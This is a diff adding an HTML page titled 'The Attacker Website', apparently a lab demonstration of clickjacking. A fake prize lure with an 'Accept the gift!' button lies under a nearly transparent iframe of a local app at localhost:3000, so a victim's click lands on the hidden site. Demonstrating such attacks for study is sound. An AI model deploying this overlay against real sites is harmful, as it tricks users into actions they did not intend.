@@ -1,0 +1,37 @@
+<html lang=en>
+  <head>
+    <meta charset=utf-8>
+    <title>The Attacker Website</title>
+    <link rel="stylesheet" type="text/css" href="css/tacit-css.min.css"/>
+    <style>
+      #vulnerable_website {
+        position:relative;
+        opacity:0.2;
+        width:1500px;
+        height:800px;
+        top:80px;
+        left: -120px;
+        z-index:2;
+        }
+      #fake_website {
+        position:absolute;
+        z-index:1;
+        }
+    </style>
+  </head>
+  <body>
+    <section>
+      <div id="fake_website">
+        <h1>You Are The Winner!!!</h1>
+        <h2>You won an awesome tropics holiday!</h2>
+        <img alt="Tropical Holiday" src="images/tropical-holiday.jpg">
+        <h2>Accept it by clicking the button below.</h2>
+        <button type="submit">Accept the gift!</button>
+      </div>      
+    </section>
+
+    <iframe id="vulnerable_website" src="http://localhost:3000">
+    </iframe>
+
+  </body>
+</html>
